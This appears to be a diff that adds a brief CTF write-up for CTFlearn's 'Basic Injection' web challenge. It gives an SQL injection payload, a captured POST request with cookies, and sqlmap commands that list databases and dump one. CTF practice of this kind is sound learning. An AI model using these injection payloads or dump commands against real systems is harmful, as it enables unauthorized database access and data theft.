@@ -1,0 +1,31 @@
+Basic Injection: https://ctflearn.com/challenge/88
+Category: Web
+Solution #1: type ' or 1=1;#
+Solution #2: Using sqlmap:
+
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev && cd sqlmap-dev
+
+req.txt:
+"""
+POST /web4/ HTTP/2
+Host: web.ctflearn.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: uk-UA,uk;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+Origin: https://web.ctflearn.com
+Connection: keep-alive
+Referer: https://web.ctflearn.com/web4/
+Cookie: __cfduid=dac6926b79f791d22436a4412bfbda2a41607683760; _ga=GA1.2.288913241.1607683762; _gid=GA1.2.1845127884.1607940401
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+TE: Trailers
+
+input=test
+"""
+
+python3 sqlmap.py -r req.txt --batch --dbs
+python3 sqlmap.py -r req.txt -D webfour --dump --threads=8
